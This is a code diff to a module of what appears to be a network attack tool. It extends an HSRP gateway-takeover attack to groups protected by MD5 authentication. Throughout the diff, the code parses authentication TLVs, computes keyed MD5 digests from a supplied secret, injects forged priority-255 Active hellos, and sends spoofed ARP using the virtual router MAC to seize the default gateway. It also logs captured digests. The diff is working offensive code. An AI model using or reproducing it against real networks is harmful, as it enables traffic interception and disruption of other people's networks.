@@ -32,6 +32,7 @@
 import struct
 import threading
 import time
+import hashlib
 
 import dnet
 import dpkt
@@ -88,6 +89,30 @@ class hsrp_packet(object):
 
     def parse(self, data):
         (self.opcode, self.state, self.hello, self.hold, self.prio, self.group, self.auth_data, self.ip) = struct.unpack("!xBBBBBBx8sI", data[:20])
+        return data[20:]
+
+class hsrp_auth_tlv(object):
+    TYPE_AUTH = 0x04
+    
+    ALGO_MD5 = 0x01
+    
+    def __init__(self, algo=None, flags=None, ip=None, keyid=None, csum=None):
+        self.algo = algo
+        self.flags = flags
+        self.ip = ip
+        self.keyid = keyid
+        self.csum = csum
+
+    def parse(self, data):
+        (self.t, self.l, self.algo, self.flags) = struct.unpack("!BBBxxB", data[:6])
+        self.ip = data[6:10]
+        self.keyid, = struct.unpack("!I", data[10:14])
+        self.csum = data[14:30]
+        return data[30:]
+    
+    def render(self):
+        value = struct.pack("!BxxB", self.algo, self.flags) + self.ip + struct.pack("!I", self.keyid) + self.csum
+        return struct.pack("!BB", self.TYPE_AUTH, len(value)) + value
 
 class hsrp_thread(threading.Thread):
     def __init__(self, parent):
@@ -99,10 +124,25 @@ class hsrp_thread(threading.Thread):
         self.parent.log("HSRP: Thread started")
         while self.running:
             for i in self.parent.peers:
-                (iter, pkg, state, arp) = self.parent.peers[i]
-                if state:
-                    hsrp = hsrp_packet(hsrp_packet.OP_HELLO, hsrp_packet.STATE_ACTIVE, pkg.hello, pkg.hold, 255, pkg.group, pkg.auth_data, pkg.ip)
-                    data = hsrp.render()
+                if self.parent.peers[i]["state"]:
+                    pkg = self.parent.peers[i]["pkg"]
+                    auth = self.parent.peers[i]["auth"]
+                    if not auth is None:
+                        hsrp = hsrp_packet(hsrp_packet.OP_HELLO, hsrp_packet.STATE_ACTIVE, pkg.hello, pkg.hold, 255, pkg.group, "\x00" * 8, pkg.ip)
+                        auth = hsrp_auth_tlv(auth.algo, auth.flags, self.parent.ip, auth.keyid, "\x00" * 16)
+                        secret = self.parent.auth_entry.get_text()
+                        key_length = struct.pack("<Q", (len(secret) << 3))
+                        key_fill = secret + '\x80' + '\x00' * (55 - len(secret)) + key_length
+                        salt = hsrp.render() + auth.render()
+                        m = hashlib.md5()
+                        m.update(key_fill)
+                        m.update(salt)
+                        m.update(secret)
+                        auth.csum = m.digest()
+                        data = hsrp.render() + auth.render()
+                    else:
+                        hsrp = hsrp_packet(hsrp_packet.OP_HELLO, hsrp_packet.STATE_ACTIVE, pkg.hello, pkg.hold, 255, pkg.group, pkg.auth_data, pkg.ip)
+                        data = hsrp.render()
                     udp_hdr = dpkt.udp.UDP( sport=HSRP_PORT,
                                             dport=HSRP_PORT,
                                             data=data
@@ -121,7 +161,7 @@ class hsrp_thread(threading.Thread):
                                                         data=str(ip_hdr)
                                                         )
                     self.parent.dnet.send(str(eth_hdr))
-                    if arp:
+                    if self.parent.peers[i]["arp"]:
                         src_mac = dnet.eth_aton("00:00:0c:07:ac:%02x" % (pkg.group))
                         brdc_mac = dnet.eth_aton("ff:ff:ff:ff:ff:ff")
                         stp_uplf_mac = dnet.eth_aton("01:00:0c:cd:cd:cd")
@@ -155,7 +195,7 @@ class hsrp_thread(threading.Thread):
                                                             data=str(arp_hdr)
                                                             )
                         self.parent.dnet.send(str(eth_hdr))
-                        self.parent.peers[i] = (iter, pkg, state, arp - 1)
+                        self.parent.peers[i]["arp"] = self.parent.peers[i]["arp"] - 1
             time.sleep(1)
         self.parent.log("HSRP: Thread terminated")
 
@@ -230,6 +270,7 @@ class mod_class(object):
         column.add_attribute(render_text, 'text', self.STORE_AUTH_ROW)
         self.treeview.append_column(column)
 
+        self.auth_entry = self.glade_xml.get_widget("auth_entry")
         self.arp_checkbutton = self.glade_xml.get_widget("arp_checkbutton")
 
         return self.glade_xml.get_widget("root")
@@ -261,10 +302,24 @@ class mod_class(object):
         if ip.src != self.ip:
             if ip.src not in self.peers:
                 pkg = hsrp_packet()
-                pkg.parse(str(udp.data))
+                auth = None
+                data = pkg.parse(str(udp.data))
+                if len(data) >= 30:
+                    auth = hsrp_auth_tlv()
+                    auth.parse(data)
                 src = dnet.ip_ntoa(ip.src)
-                iter = self.liststore.append([src, dnet.ip_ntoa(pkg.ip), pkg.prio, "Seen", pkg.auth_data])
-                self.peers[ip.src] = (iter, pkg, False, False)
+                if not auth is None:
+                    auth_str = "MD5: %s key#%d" % (auth.csum.encode("hex"), auth.keyid)
+                else:
+                    auth_str = pkg.auth_data
+                iter = self.liststore.append([src, dnet.ip_ntoa(pkg.ip), pkg.prio, "Seen", auth_str])
+                self.peers[ip.src] = {
+                    "iter"  :   iter,
+                    "pkg"   :   pkg,
+                    "auth"  :   auth,
+                    "state" :   False,
+                    "arp"   :   False
+                    }
                 self.log("HSRP: Got new peer %s" % (src))
 
     # SIGNALS #
@@ -275,12 +330,12 @@ class mod_class(object):
         for i in paths:
             iter = model.get_iter(i)
             peer = dnet.ip_aton(model.get_value(iter, self.STORE_SRC_ROW))
-            (iter, pkg, run, arp) = self.peers[peer]
             if self.arp_checkbutton.get_active():
                 arp = 3
             else:
                 arp = 0
-            self.peers[peer] = (iter, pkg, True, arp)
+            self.peers[peer]["state"] = True
+            self.peers[peer]["arp"] = arp
             model.set_value(iter, self.STORE_STATE_ROW, "Taken")
         if not self.thread.is_alive():
             self.thread.start()
@@ -291,8 +346,7 @@ class mod_class(object):
         for i in paths:
             iter = model.get_iter(i)
             peer = dnet.ip_aton(model.get_value(iter, self.STORE_SRC_ROW))
-            (iter, pkg, run, arp) = self.peers[peer]
-            self.peers[peer] = (iter, pkg, False, arp)
+            self.peers[peer]["state"] = False
             model.set_value(iter, self.STORE_STATE_ROW, "Released")
 
 
